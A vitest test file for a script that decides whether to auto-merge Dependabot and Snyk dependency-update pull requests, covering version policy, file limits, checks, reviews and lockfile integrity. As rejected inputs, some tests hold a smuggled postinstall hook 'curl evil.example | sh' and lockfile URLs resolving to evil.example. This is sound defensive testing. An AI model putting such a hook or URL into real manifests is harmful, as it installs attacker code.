import { describe, expect, it } from "vitest";

import {
  actionVersion,
  allowedPathsFor,
  classifyActionRef,
  classifyVersionChange,
  collectResolvedUrls,
  deriveLockfileUpdates,
  deriveManifestUpdates,
  deriveWorkflowUpdates,
  evaluateChangedFiles,
  evaluateChecks,
  evaluateLockfileChanges,
  evaluateManifestChanges,
  evaluatePullRequest,
  evaluateReviews,
  evaluateUpdates,
  evaluateWorkflowChanges,
  identifySource,
  lockEntryDependencyType,
  parseDependabotUpdates,
  parseSnykUpdate,
  preflight,
  REQUIRED_CHECKS,
  resolveDependencyType,
  resolvedUrlMatchesPackage,
  run,
  SNYK_AUTHORS,
  verifyActionReferences,
} from "../../.github/scripts/auto-merge-dependency-updates.js";

// Verbatim commit message from streetlives/yourpeer.nyc#719, a single-dependency
// Dependabot update whose trailer carries no update-type.
const SINGLE_DEPENDENCY_COMMIT = `build(deps-dev): bump js-yaml from 4.1.0 to 4.3.2

Bumps [js-yaml](https://github.com/nodeca/js-yaml) from 4.1.0 to 4.3.2.
- [Changelog](https://github.com/nodeca/js-yaml/blob/4.3.2/CHANGELOG.md)
- [Commits](https://github.com/nodeca/js-yaml/compare/4.1.0...4.3.2)

---
updated-dependencies:
- dependency-name: js-yaml
  dependency-version: 4.3.2
  dependency-type: indirect
...

Signed-off-by: dependabot[bot] <support@github.com>`;

// Verbatim commit message from streetlives/yourpeer.nyc#718, a grouped update where
// the headline only gives a "to" version for the first dependency.
const GROUPED_COMMIT = `build(deps): bump sharp and next

Bumps [sharp](https://github.com/lovell/sharp) to 0.35.4 and updates ancestor dependency [next](https://github.com/vercel/next.js). These dependencies need to be updated together.


Updates \`sharp\` from 0.34.4 to 0.35.4
- [Release notes](https://github.com/lovell/sharp/releases)
- [Commits](https://github.com/lovell/sharp/compare/v0.34.4...v0.35.4)

Updates \`next\` from 15.5.9 to 15.5.25
- [Release notes](https://github.com/vercel/next.js/releases)
- [Commits](https://github.com/vercel/next.js/compare/v15.5.9...v15.5.25)

---
updated-dependencies:
- dependency-name: sharp
  dependency-version: 0.35.4
  dependency-type: indirect
- dependency-name: next
  dependency-version: 15.5.25
  dependency-type: direct:production
...

Signed-off-by: dependabot[bot] <support@github.com>`;

// Verbatim commit message from streetlives/yourpeer.nyc#716, where an ancestor
// upgrade drops a transitive dependency and the trailer quotes the scoped name.
const REMOVAL_COMMIT = `build(deps): bump @vitest/mocker and vitest

Removes [@vitest/mocker](https://github.com/vitest-dev/vitest/tree/HEAD/packages/mocker). It's no longer used after updating ancestor dependency [vitest](https://github.com/vitest-dev/vitest/tree/HEAD/packages/vitest). These dependencies need to be updated together.


Removes \`@vitest/mocker\`

Updates \`vitest\` from 4.1.6 to 4.1.11
- [Release notes](https://github.com/vitest-dev/vitest/releases)

---
updated-dependencies:
- dependency-name: "@vitest/mocker"
  dependency-version:
  dependency-type: indirect
- dependency-name: vitest
  dependency-version: 4.1.11
  dependency-type: direct:development
...

Signed-off-by: dependabot[bot] <support@github.com>`;

const PACKAGE_JSON = {
  dependencies: { axios: "^1.8.2", next: "15.5.3" },
  devDependencies: { prettier: "^3.3.2" },
};

function checkRun(
  name: string,
  conclusion: string | null,
  status = "completed",
  id = 1,
) {
  return { name, conclusion, status, id };
}

function passingChecks() {
  return REQUIRED_CHECKS.map((name: string, index: number) =>
    checkRun(name, "success", "completed", index + 1),
  );
}

describe("classifyVersionChange", () => {
  it("classifies ordinary bumps", () => {
    expect(classifyVersionChange("1.2.3", "1.2.4")).toBe("patch");
    expect(classifyVersionChange("1.2.3", "1.3.0")).toBe("minor");
    expect(classifyVersionChange("1.2.3", "2.0.0")).toBe("major");
  });

  it("treats a pre-1.0 minor bump as breaking", () => {
    expect(classifyVersionChange("0.34.4", "0.35.4")).toBe("major");
    expect(classifyVersionChange("0.34.4", "0.34.9")).toBe("patch");
  });

  it("refuses downgrades, no-ops, prereleases and junk", () => {
    expect(classifyVersionChange("1.3.0", "1.2.9")).toBeNull();
    expect(classifyVersionChange("1.2.3", "1.2.3")).toBeNull();
    expect(classifyVersionChange("1.2.3", "2.0.0-beta.1")).toBeNull();
    expect(classifyVersionChange("1.2.3", "latest")).toBeNull();
    expect(classifyVersionChange(null, "1.2.4")).toBeNull();
  });

  it("tolerates range and tag prefixes", () => {
    expect(classifyVersionChange("^1.2.3", "v1.2.4")).toBe("patch");
  });
});

describe("parseDependabotUpdates", () => {
  it("reads a single-dependency commit", () => {
    expect(parseDependabotUpdates(SINGLE_DEPENDENCY_COMMIT)).toEqual([
      {
        name: "js-yaml",
        fromVersion: "4.1.0",
        toVersion: "4.3.2",
        dependencyType: "indirect",
        removed: false,
      },
    ]);
  });

  it("reads every dependency out of a grouped commit", () => {
    expect(parseDependabotUpdates(GROUPED_COMMIT)).toEqual([
      {
        name: "sharp",
        fromVersion: "0.34.4",
        toVersion: "0.35.4",
        dependencyType: "indirect",
        removed: false,
      },
      {
        name: "next",
        fromVersion: "15.5.9",
        toVersion: "15.5.25",
        dependencyType: "direct:production",
        removed: false,
      },
    ]);
  });

  it("unquotes scoped names and flags removed dependencies", () => {
    expect(parseDependabotUpdates(REMOVAL_COMMIT)).toEqual([
      {
        name: "@vitest/mocker",
        fromVersion: null,
        toVersion: null,
        dependencyType: "indirect",
        removed: true,
      },
      {
        name: "vitest",
        fromVersion: "4.1.6",
        toVersion: "4.1.11",
        dependencyType: "direct:development",
        removed: false,
      },
    ]);
  });

  it("returns nothing for a commit without a trailer", () => {
    expect(parseDependabotUpdates("fix: unrelated change")).toEqual([]);
  });
});

describe("evaluateUpdates", () => {
  it("allows a patch bump of a production dependency", () => {
    expect(
      evaluateUpdates([
        {
          name: "next",
          fromVersion: "15.5.9",
          toVersion: "15.5.25",
          dependencyType: "direct:production",
        },
      ]).safe,
    ).toBe(true);
  });

  it("allows a minor bump of a dev dependency but not of a production one", () => {
    expect(
      evaluateUpdates([
        {
          name: "vitest",
          fromVersion: "4.1.0",
          toVersion: "4.2.0",
          dependencyType: "direct:development",
        },
      ]).safe,
    ).toBe(true);

    const production = evaluateUpdates([
      {
        name: "axios",
        fromVersion: "1.8.2",
        toVersion: "1.9.0",
        dependencyType: "direct:production",
      },
    ]);
    expect(production.safe).toBe(false);
    expect(production.reason).toContain("minor");
  });

  it("holds transitive dependencies to the production rule", () => {
    expect(
      evaluateUpdates(parseDependabotUpdates(SINGLE_DEPENDENCY_COMMIT)).safe,
    ).toBe(false);
  });

  it("rejects a group when any member is out of policy", () => {
    // sharp 0.34.4 -> 0.35.4 is breaking below 1.0.0, even though next is a patch.
    const grouped = evaluateUpdates(parseDependabotUpdates(GROUPED_COMMIT));
    expect(grouped.safe).toBe(false);
    expect(grouped.reason).toContain("sharp");
  });

  it("allows a transitive dependency that an ancestor upgrade drops", () => {
    const result = evaluateUpdates(parseDependabotUpdates(REMOVAL_COMMIT));
    expect(result.safe).toBe(true);
    expect(result.reason).toContain("@vitest/mocker removed");
  });

  it("refuses to drop a direct dependency", () => {
    expect(
      evaluateUpdates([
        {
          name: "axios",
          fromVersion: null,
          toVersion: null,
          dependencyType: "direct:production",
          removed: true,
        },
      ]).safe,
    ).toBe(false);
  });

  it("rejects an empty or unparseable update list", () => {
    expect(evaluateUpdates([]).safe).toBe(false);
    expect(
      evaluateUpdates([
        {
          name: "mystery",
          fromVersion: null,
          toVersion: "1.2.3",
          dependencyType: "direct:development",
        },
      ]).safe,
    ).toBe(false);
  });
});

describe("parseSnykUpdate", () => {
  it("reads a security upgrade title and resolves the dependency type", () => {
    expect(
      parseSnykUpdate(
        "[Snyk] Security upgrade axios from 1.8.2 to 1.13.5",
        PACKAGE_JSON,
      ),
    ).toEqual({
      name: "axios",
      fromVersion: "1.8.2",
      toVersion: "1.13.5",
      dependencyType: "direct:production",
    });
  });

  it("reads a plain upgrade title", () => {
    expect(
      parseSnykUpdate(
        "[Snyk] Upgrade prettier from 3.3.2 to 3.4.0",
        PACKAGE_JSON,
      )?.dependencyType,
    ).toBe("direct:development");
  });

  it("returns null for titles without versions", () => {
    expect(
      parseSnykUpdate("[Snyk] Fix for 2 vulnerabilities", PACKAGE_JSON),
    ).toBeNull();
  });
});

describe("resolveDependencyType", () => {
  it("separates production, development and transitive packages", () => {
    expect(resolveDependencyType(PACKAGE_JSON, "axios")).toBe(
      "direct:production",
    );
    expect(resolveDependencyType(PACKAGE_JSON, "prettier")).toBe(
      "direct:development",
    );
    expect(resolveDependencyType(PACKAGE_JSON, "lodash")).toBe("indirect");
    expect(resolveDependencyType(undefined, "axios")).toBe("indirect");
  });
});

describe("identifySource", () => {
  const pullRequest = (login: string, ref: string) => ({
    user: { login },
    head: { ref },
  });

  it("recognises Dependabot by author and Snyk by branch", () => {
    expect(
      identifySource(
        pullRequest("dependabot[bot]", "dependabot/npm_and_yarn/x"),
      ),
    ).toBe("dependabot");
    expect(
      identifySource(
        pullRequest("jbeard4", "snyk-fix-8d5083c3bb6e23ba36b4584c75155e26"),
      ),
    ).toBe("snyk");
  });

  it("ignores everything else, including a human branch that mentions snyk", () => {
    expect(identifySource(pullRequest("jbeard4", "fix/snyk-notes"))).toBeNull();
    expect(identifySource(pullRequest("someone", "feat/thing"))).toBeNull();
  });
});

describe("preflight", () => {
  const base = {
    draft: false,
    head: { repo: { fork: false } },
    labels: [],
  };

  it("passes an ordinary bot pull request", () => {
    expect(preflight(base).safe).toBe(true);
  });

  it("holds drafts, forks and labelled pull requests", () => {
    expect(preflight({ ...base, draft: true }).safe).toBe(false);
    expect(preflight({ ...base, head: { repo: { fork: true } } }).safe).toBe(
      false,
    );

    const labelled = preflight({ ...base, labels: [{ name: "do-not-merge" }] });
    expect(labelled.safe).toBe(false);
    expect(labelled.reason).toContain("do-not-merge");
  });
});

describe("evaluateChangedFiles", () => {
  it("accepts npm manifests only", () => {
    const allowed = allowedPathsFor(
      "dependabot",
      "dependabot/npm_and_yarn/js-yaml",
    );
    expect(
      evaluateChangedFiles(["package.json", "package-lock.json"], allowed).safe,
    ).toBe(true);

    const rejected = evaluateChangedFiles(
      ["package.json", "src/app/page.tsx"],
      allowed,
    );
    expect(rejected.safe).toBe(false);
    expect(rejected.reason).toContain("src/app/page.tsx");
  });

  it("accepts workflow files for github-actions updates", () => {
    const allowed = allowedPathsFor(
      "dependabot",
      "dependabot/github_actions/actions/checkout-5",
    );
    expect(
      evaluateChangedFiles([".github/workflows/tests.yml"], allowed).safe,
    ).toBe(true);
    expect(evaluateChangedFiles(["package.json"], allowed).safe).toBe(false);
  });

  it("lets Snyk touch its policy file", () => {
    const allowed = allowedPathsFor("snyk", "snyk-fix-abc123");
    expect(evaluateChangedFiles([".snyk", "package.json"], allowed).safe).toBe(
      true,
    );
  });

  it("rejects an empty diff", () => {
    expect(
      evaluateChangedFiles(
        [],
        allowedPathsFor("dependabot", "dependabot/npm_and_yarn/x"),
      ).safe,
    ).toBe(false);
  });
});

describe("evaluateChecks", () => {
  it("passes when every required check succeeded", () => {
    expect(evaluateChecks(passingChecks(), []).state).toBe("passed");
  });

  it("waits while a required check is missing or still running", () => {
    expect(evaluateChecks(passingChecks().slice(1), []).state).toBe("pending");

    const running = passingChecks();
    running[0] = checkRun(running[0].name, null, "in_progress", 1);
    expect(evaluateChecks(running, []).state).toBe("pending");
  });

  it("fails on a failing required check", () => {
    const failing = passingChecks();
    failing[0] = checkRun(failing[0].name, "failure", "completed", 1);
    expect(evaluateChecks(failing, []).state).toBe("failed");
  });

  it("fails on a failing non-required check", () => {
    const checks = [
      ...passingChecks(),
      checkRun("Lighthouse", "failure", "completed", 99),
    ];
    expect(evaluateChecks(checks, []).state).toBe("failed");
  });

  it("ignores the advisory Codex review check", () => {
    const checks = [
      ...passingChecks(),
      checkRun("codex_auto_approve", "failure", "completed", 99),
    ];
    expect(evaluateChecks(checks, []).state).toBe("passed");
  });

  it("uses the newest run of a re-run check", () => {
    const checks = [
      ...passingChecks(),
      checkRun(REQUIRED_CHECKS[0], "failure", "completed", 1000),
    ];
    expect(evaluateChecks(checks, []).state).toBe("failed");

    const rerun = [
      checkRun(REQUIRED_CHECKS[0], "failure", "completed", 1),
      ...passingChecks().map((check, index) =>
        checkRun(check.name, "success", "completed", index + 100),
      ),
    ];
    expect(evaluateChecks(rerun, []).state).toBe("passed");
  });

  it("blocks on a failing commit status but not a pending one", () => {
    expect(
      evaluateChecks(passingChecks(), [
        { context: "security/snyk", state: "failure" },
      ]).state,
    ).toBe("failed");
    expect(
      evaluateChecks(passingChecks(), [
        { context: "security/snyk", state: "pending" },
      ]).state,
    ).toBe("passed");
  });
});

describe("evaluateReviews", () => {
  it("blocks when a human has requested changes", () => {
    const result = evaluateReviews([
      { user: { login: "jbeard4" }, state: "CHANGES_REQUESTED" },
    ]);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("jbeard4");
  });

  it("honours a later approval from the same reviewer", () => {
    expect(
      evaluateReviews([
        { user: { login: "jbeard4" }, state: "CHANGES_REQUESTED" },
        { user: { login: "jbeard4" }, state: "APPROVED" },
      ]).safe,
    ).toBe(true);
  });

  it("ignores bot reviews, which cannot run on Dependabot pull requests", () => {
    expect(
      evaluateReviews([
        { user: { login: "github-actions[bot]" }, state: "CHANGES_REQUESTED" },
      ]).safe,
    ).toBe(true);
  });

  it("ignores comment-only reviews", () => {
    expect(
      evaluateReviews([{ user: { login: "jbeard4" }, state: "COMMENTED" }])
        .safe,
    ).toBe(true);
  });
});

// Verbatim commit message from streetlives/yourpeer.nyc#715, a lockfile-only patch
// bump of a transitive dependency — the smallest thing the policy actually merges.
const PATCH_COMMIT = `build(deps): bump postcss-selector-parser from 6.1.0 to 6.1.4

Bumps [postcss-selector-parser](https://github.com/postcss/postcss-selector-parser) from 6.1.0 to 6.1.4.
- [Release notes](https://github.com/postcss/postcss-selector-parser/releases)

---
updated-dependencies:
- dependency-name: postcss-selector-parser
  dependency-version: 6.1.4
  dependency-type: indirect
...

Signed-off-by: dependabot[bot] <support@github.com>`;

const AXIOS_UPDATE = [
  {
    name: "axios",
    fromVersion: "1.8.2",
    toVersion: "1.8.3",
    dependencyType: "direct:production",
    removed: false,
  },
];

const BASE_MANIFEST = {
  name: "yourpeer.nyc-nextjs",
  scripts: { build: "next build" },
  dependencies: { axios: "^1.8.2", next: "15.5.3" },
  devDependencies: { prettier: "^3.3.2" },
};

function lockfile(packages: Record<string, unknown>) {
  return {
    name: "yourpeer.nyc-nextjs",
    version: "0.1.0",
    lockfileVersion: 3,
    packages,
  };
}

const BASE_LOCK = lockfile({
  "node_modules/axios": {
    version: "1.8.2",
    resolved: "https://registry.npmjs.org/axios/-/axios-1.8.2.tgz",
    integrity: "sha512-base",
  },
});

describe("evaluateManifestChanges", () => {
  it("accepts a bump that matches the declared update", () => {
    const head = {
      ...BASE_MANIFEST,
      dependencies: { ...BASE_MANIFEST.dependencies, axios: "^1.8.3" },
    };
    expect(
      evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE).safe,
    ).toBe(true);
  });

  it("rejects a smuggled install script", () => {
    const head = {
      ...BASE_MANIFEST,
      scripts: {
        ...BASE_MANIFEST.scripts,
        postinstall: "curl evil.example | sh",
      },
      dependencies: { ...BASE_MANIFEST.dependencies, axios: "^1.8.3" },
    };
    const result = evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("outside its dependency lists");
  });

  it("rejects a dependency the pull request never declared", () => {
    const head = {
      ...BASE_MANIFEST,
      dependencies: {
        ...BASE_MANIFEST.dependencies,
        axios: "^1.8.3",
        "evil-package": "^1.0.0",
      },
    };
    const result = evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("evil-package");
  });

  it("rejects a version that does not match what the pull request claims", () => {
    const head = {
      ...BASE_MANIFEST,
      dependencies: { ...BASE_MANIFEST.dependencies, axios: "^2.0.0" },
    };
    const result = evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("not the 1.8.3");
  });

  it("rejects a dropped dependency and an unreadable manifest", () => {
    const head = { ...BASE_MANIFEST, dependencies: { next: "15.5.3" } };
    expect(
      evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE).safe,
    ).toBe(false);
    expect(
      evaluateManifestChanges(null, BASE_MANIFEST, AXIOS_UPDATE).safe,
    ).toBe(false);
  });
});

describe("evaluateLockfileChanges", () => {
  it("accepts a bump resolved from the npm registry", () => {
    const head = lockfile({
      "node_modules/axios": {
        version: "1.8.3",
        resolved: "https://registry.npmjs.org/axios/-/axios-1.8.3.tgz",
        integrity: "sha512-new",
      },
    });
    expect(evaluateLockfileChanges(BASE_LOCK, head).safe).toBe(true);
  });

  it("rejects a package newly resolved from outside the registry", () => {
    const head = lockfile({
      "node_modules/axios": {
        version: "1.8.3",
        resolved: "https://evil.example/axios-1.8.3.tgz",
        integrity: "sha512-new",
      },
    });
    const result = evaluateLockfileChanges(BASE_LOCK, head);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("evil.example");
  });

  it("rejects an integrity swap on an unchanged version", () => {
    const head = lockfile({
      "node_modules/axios": {
        version: "1.8.2",
        resolved: "https://registry.npmjs.org/axios/-/axios-1.8.2.tgz",
        integrity: "sha512-tampered",
      },
    });
    const result = evaluateLockfileChanges(BASE_LOCK, head);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("integrity hash");
  });

  it("rejects a lockfileVersion change and an unreadable lockfile", () => {
    expect(
      evaluateLockfileChanges(BASE_LOCK, { ...BASE_LOCK, lockfileVersion: 2 })
        .safe,
    ).toBe(false);
    expect(evaluateLockfileChanges(BASE_LOCK, null).safe).toBe(false);
  });

  it("finds resolved URLs in the legacy dependency tree too", () => {
    const urls = collectResolvedUrls({
      dependencies: {
        axios: {
          resolved: "https://registry.npmjs.org/axios/-/axios-1.8.2.tgz",
          dependencies: {
            follow_redirects: { resolved: "https://evil.example/x.tgz" },
          },
        },
      },
    });
    expect([...urls]).toContain("https://evil.example/x.tgz");
  });
});

// A minimal stand-in for the Octokit the workflow hands to run(), so the gates can
// be exercised end to end: which pull requests are candidates, what gets read at
// which commit, and exactly what is passed to the merge API.
function fakeGithub(state: any) {
  const calls: { merges: any[]; comments: any[] } = {
    merges: [],
    comments: [],
  };
  const pullResponses = [...(state.pullSequence || [state.pull])];
  const nextPull = () =>
    pullResponses.length > 1 ? pullResponses.shift() : pullResponses[0];

  const github = {
    paginate: async (fn: any, params: any) => (await fn(params)).data,
    rest: {
      pulls: {
        list: async () => ({ data: [state.pull] }),
        get: async () => ({ data: nextPull() }),
        listFiles: async () => ({
          data: (state.files || []).map((filename: string) => ({ filename })),
        }),
        listCommits: async () => ({
          data: (state.commits || []).map((message: string) => ({
            commit: { message },
          })),
        }),
        listReviews: async () => ({ data: state.reviews || [] }),
        merge: async (params: any) => {
          calls.merges.push(params);
          return { data: { merged: true } };
        },
      },
      checks: {
        listForRef: async () => ({ data: state.checkRuns || passingChecks() }),
      },
      repos: {
        getCombinedStatusForRef: async () => ({
          data: { statuses: state.statuses || [] },
        }),
        getContent: async ({ path, ref }: any) => {
          const content = state.contents?.[`${ref}:${path}`] ?? null;
          return {
            data:
              typeof content === "string" ? content : JSON.stringify(content),
          };
        },
      },
      issues: {
        createComment: async (params: any) => {
          calls.comments.push(params);
        },
      },
      git: {
        getRef: async ({ owner, repo, ref }: any) => {
          const sha =
            state.tags?.[`${owner}/${repo}@${ref.replace("tags/", "")}`];
          if (!sha) throw new Error("Not Found");
          return { data: { object: { type: "commit", sha } } };
        },
        getTag: async () => {
          throw new Error("Not Found");
        },
      },
    },
  };

  return { github, calls };
}

const CONTEXT = { repo: { owner: "streetlives", repo: "yourpeer.nyc" } };

const CORE = {
  info: () => {},
  warning: () => {},
  summary: {
    addHeading() {
      return this;
    },
    addTable() {
      return this;
    },
    async write() {},
  },
};

function pull(overrides: any = {}) {
  return {
    number: 715,
    title: "build(deps): bump postcss-selector-parser from 6.1.0 to 6.1.4",
    draft: false,
    labels: [],
    mergeable: true,
    mergeable_state: "blocked",
    user: { login: "dependabot[bot]" },
    head: {
      ref: "dependabot/npm_and_yarn/postcss-selector-parser-6.1.4",
      sha: "headsha1",
      repo: { fork: false },
    },
    base: { ref: "main", sha: "basesha1" },
    ...overrides,
  };
}

describe("evaluatePullRequest", () => {
  it("merges a lockfile-only patch bump from Dependabot", async () => {
    const { github } = fakeGithub({
      pull: pull(),
      files: ["package-lock.json"],
      commits: [PATCH_COMMIT],
      contents: {
        "basesha1:package-lock.json": BASE_LOCK,
        "headsha1:package-lock.json": BASE_LOCK,
      },
    });

    const decision = await evaluatePullRequest({
      github,
      context: CONTEXT,
      pullRequest: pull(),
    });
    expect(decision.action).toBe("merge");
    expect(decision.headSha).toBe("headsha1");
  });

  it("refuses a Snyk-shaped branch from an account not connected to Snyk", async () => {
    const attacker = pull({
      user: { login: "drive-by-contributor" },
      head: { ref: "snyk-fix-abc123", sha: "headsha1", repo: { fork: false } },
      title: "[Snyk] Security upgrade axios from 1.8.2 to 1.8.3",
    });
    const { github } = fakeGithub({ pull: attacker, files: ["package.json"] });

    const decision = await evaluatePullRequest({
      github,
      context: CONTEXT,
      pullRequest: attacker,
    });
    expect(decision.action).toBe("skip");
    expect(decision.reason).toBe("not a dependency update");
  });

  it("refuses a Snyk pull request that edits anything but its dependency lists", async () => {
    // The file list alone looks legitimate: package.json only, patch-sized title.
    const spoofed = pull({
      user: { login: SNYK_AUTHORS[0] },
      head: { ref: "snyk-fix-abc123", sha: "headsha1", repo: { fork: false } },
      title: "[Snyk] Security upgrade axios from 1.8.2 to 1.8.3",
    });
    const { github } = fakeGithub({
      pull: spoofed,
      files: ["package.json"],
      commits: ["fix: upgrade axios"],
      contents: {
        "basesha1:package.json": BASE_MANIFEST,
        "headsha1:package.json": {
          ...BASE_MANIFEST,
          scripts: {
            ...BASE_MANIFEST.scripts,
            postinstall: "curl evil.example | sh",
          },
          dependencies: { ...BASE_MANIFEST.dependencies, axios: "^1.8.3" },
        },
      },
    });

    const decision = await evaluatePullRequest({
      github,
      context: CONTEXT,
      pullRequest: spoofed,
    });
    expect(decision.action).toBe("skip");
    expect(decision.reason).toContain("outside its dependency lists");
  });

  it("waits when a commit lands while the pull request is being evaluated", async () => {
    const before = pull();
    const after = pull({
      head: { ...before.head, sha: "headsha2" },
    });
    const { github } = fakeGithub({
      pull: before,
      pullSequence: [before, after],
      files: ["package-lock.json"],
      commits: [PATCH_COMMIT],
      contents: {
        "basesha1:package-lock.json": BASE_LOCK,
        "headsha1:package-lock.json": BASE_LOCK,
      },
    });

    const decision = await evaluatePullRequest({
      github,
      context: CONTEXT,
      pullRequest: before,
    });
    expect(decision.action).toBe("wait");
    expect(decision.reason).toContain("head commit changed");
  });
});

describe("run", () => {
  const mergeableState = () => ({
    pull: pull(),
    files: ["package-lock.json"],
    commits: [PATCH_COMMIT],
    contents: {
      "basesha1:package-lock.json": BASE_LOCK,
      "headsha1:package-lock.json": BASE_LOCK,
    },
  });

  it("merges the evaluated commit, not whatever is at the head by then", async () => {
    const { github, calls } = fakeGithub(mergeableState());

    await run({ github, context: CONTEXT, core: CORE });

    expect(calls.merges).toHaveLength(1);
    expect(calls.merges[0].sha).toBe("headsha1");
    expect(calls.merges[0].merge_method).toBe("squash");
    expect(calls.comments).toHaveLength(1);
  });

  it("merges nothing on a dry run", async () => {
    const { github, calls } = fakeGithub(mergeableState());

    await run({ github, context: CONTEXT, core: CORE, dryRun: true });

    expect(calls.merges).toHaveLength(0);
    expect(calls.comments).toHaveLength(0);
  });

  it("merges nothing when a required check is still running", async () => {
    const checkRuns = passingChecks();
    checkRuns[0] = checkRun(checkRuns[0].name, null, "in_progress", 1);
    const { github, calls } = fakeGithub({ ...mergeableState(), checkRuns });

    await run({ github, context: CONTEXT, core: CORE });

    expect(calls.merges).toHaveLength(0);
  });
});

describe("policy is derived from the diff, not from what the pull request claims", () => {
  it("rejects a manifest change larger than the declared update", () => {
    // The title and trailer say patch; package.json actually crosses a major.
    const base = {
      ...BASE_MANIFEST,
      dependencies: { ...BASE_MANIFEST.dependencies, axios: "0.27.2" },
    };
    const head = {
      ...BASE_MANIFEST,
      dependencies: { ...BASE_MANIFEST.dependencies, axios: "1.8.3" },
    };
    const result = evaluateManifestChanges(base, head, AXIOS_UPDATE);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("major");
  });

  it("takes the policy tier from the manifest field, not from the claim", () => {
    // Claimed as a devDependency to buy the looser minor rule; axios is production.
    const claimedAsDev = [
      {
        name: "axios",
        fromVersion: "1.8.2",
        toVersion: "1.9.0",
        dependencyType: "direct:development",
        removed: false,
      },
    ];
    const head = {
      ...BASE_MANIFEST,
      dependencies: { ...BASE_MANIFEST.dependencies, axios: "^1.9.0" },
    };
    const result = evaluateManifestChanges(BASE_MANIFEST, head, claimedAsDev);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("direct:production");
  });

  it("derives both ends of every manifest change", () => {
    const head = {
      ...BASE_MANIFEST,
      dependencies: { ...BASE_MANIFEST.dependencies, axios: "^1.8.3" },
      devDependencies: { prettier: "^3.4.0" },
    };
    expect(deriveManifestUpdates(BASE_MANIFEST, head)).toEqual([
      {
        name: "axios",
        field: "dependencies",
        fromVersion: "^1.8.2",
        toVersion: "^1.8.3",
        dependencyType: "direct:production",
        added: false,
        removed: false,
      },
      {
        name: "prettier",
        field: "devDependencies",
        fromVersion: "^3.3.2",
        toVersion: "^3.4.0",
        dependencyType: "direct:development",
        added: false,
        removed: false,
      },
    ]);
  });

  it("rejects an undeclared major upgrade hiding in the lockfile", () => {
    const base = lockfile({
      "node_modules/lodash": {
        version: "1.0.0",
        resolved: "https://registry.npmjs.org/lodash/-/lodash-1.0.0.tgz",
        integrity: "sha512-old",
      },
    });
    const head = lockfile({
      "node_modules/lodash": {
        version: "2.0.0",
        resolved: "https://registry.npmjs.org/lodash/-/lodash-2.0.0.tgz",
        integrity: "sha512-new",
      },
    });
    const result = evaluateLockfileChanges(base, head, BASE_MANIFEST);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("major");
  });

  it("polices a dev-only lockfile entry as a development dependency", () => {
    const entry = (version: string, dev: boolean) => ({
      "node_modules/tinypool": {
        version,
        resolved: `https://registry.npmjs.org/tinypool/-/tinypool-${version}.tgz`,
        integrity: `sha512-${version}`,
        ...(dev ? { dev: true } : {}),
      },
    });

    // Dev tree: a minor bump is in policy and cannot reach production.
    expect(
      evaluateLockfileChanges(
        lockfile(entry("1.0.0", true)),
        lockfile(entry("1.1.0", true)),
        BASE_MANIFEST,
      ).safe,
    ).toBe(true);

    // Same bump in the production tree is not.
    expect(
      evaluateLockfileChanges(
        lockfile(entry("1.0.0", false)),
        lockfile(entry("1.1.0", false)),
        BASE_MANIFEST,
      ).safe,
    ).toBe(false);
  });

  it("types a direct dependency from the manifest rather than the dev flag", () => {
    const entry = (version: string) => ({
      "node_modules/axios": {
        version,
        resolved: `https://registry.npmjs.org/axios/-/axios-${version}.tgz`,
        integrity: `sha512-${version}`,
      },
    });
    expect(
      evaluateLockfileChanges(
        lockfile(entry("1.8.2")),
        lockfile(entry("1.9.0")),
        BASE_MANIFEST,
      ).safe,
    ).toBe(false);
    expect(
      deriveLockfileUpdates(
        lockfile(entry("1.8.2")),
        lockfile(entry("1.9.0")),
        BASE_MANIFEST,
      )[0].dependencyType,
    ).toBe("direct:production");
  });

  it("merges nothing when an eligible patch pull request smuggles a major into the lockfile", async () => {
    const withLodash = (version: string) =>
      lockfile({
        "node_modules/axios": {
          version: "1.8.2",
          resolved: "https://registry.npmjs.org/axios/-/axios-1.8.2.tgz",
          integrity: "sha512-base",
        },
        "node_modules/lodash": {
          version,
          resolved: `https://registry.npmjs.org/lodash/-/lodash-${version}.tgz`,
          integrity: `sha512-${version}`,
        },
      });

    const { github, calls } = fakeGithub({
      pull: pull(),
      files: ["package-lock.json"],
      commits: [PATCH_COMMIT],
      contents: {
        "basesha1:package.json": BASE_MANIFEST,
        "headsha1:package.json": BASE_MANIFEST,
        "basesha1:package-lock.json": withLodash("1.0.0"),
        "headsha1:package-lock.json": withLodash("2.0.0"),
      },
    });

    await run({ github, context: CONTEXT, core: CORE });

    expect(calls.merges).toHaveLength(0);
  });
});

const WORKFLOW = `name: Tests
on: [pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1 (tag v5)
      - uses: actions/setup-node@abcdef1234567890abcdef1234567890abcdef12 # v4.1.0 (tag v4)
      - run: npm ci
      - run: npm run test:unit:run
`;

const ACTION_BUMP_COMMIT = `build(deps): bump actions/checkout from 5.0.1 to 5.0.2

Bumps [actions/checkout](https://github.com/actions/checkout) from 5.0.1 to 5.0.2.

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-version: 5.0.2
  dependency-type: direct:production
...

Signed-off-by: dependabot[bot] <support@github.com>`;

const SHA_V5_0_1 = "93cb6efe18208431cddfb8368fd83d5badbf9bfd";
const SHA_V5_0_2 = "1111111111111111111111111111111111111111";

function bumpCheckout(workflow: string, version: string, sha = SHA_V5_0_2) {
  return workflow.replace(
    `${SHA_V5_0_1} # v5.0.1 (tag v5)`,
    `${sha} # v${version} (tag v5)`,
  );
}

function actionsPull(overrides: any = {}) {
  return pull({
    number: 730,
    title: "build(deps): bump actions/checkout from 5.0.1 to 5.0.2",
    head: {
      ref: "dependabot/github_actions/actions/checkout-5.0.2",
      sha: "headsha1",
      repo: { fork: false },
    },
    ...overrides,
  });
}

describe("workflow updates", () => {
